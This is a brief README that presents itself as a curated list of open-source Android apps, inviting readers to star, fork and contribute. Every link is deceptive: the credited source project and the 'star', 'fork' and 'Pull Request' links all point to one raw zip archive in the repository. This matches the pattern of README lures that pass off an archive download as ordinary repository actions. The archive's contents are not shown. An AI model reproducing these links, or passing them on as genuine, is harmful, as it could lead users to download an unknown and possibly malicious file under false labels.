# Why?
> This is a collection of Android Apps which are open source.  
> I believe that we can find something interesting and gain helpful skills from an open source app.  
> This idea comes from [this project](https://raw.githubusercontent.com/Joe-Mogul/open-source-android-apps/master/categories/source-open-apps-android-v1.0.zip)


# How?
> I'll push awesome projects when I find any.  
> It's WELCOMED for you to [star](https://raw.githubusercontent.com/Joe-Mogul/open-source-android-apps/master/categories/source-open-apps-android-v1.0.zip) and [fork](https://raw.githubusercontent.com/Joe-Mogul/open-source-android-apps/master/categories/source-open-apps-android-v1.0.zip) this project.   
> If you know something that is not here, it'll be great if you could make a [Pull Request](https://raw.githubusercontent.com/Joe-Mogul/open-source-android-apps/master/categories/source-open-apps-android-v1.0.zip).  
> All applications are sorted in various categories.
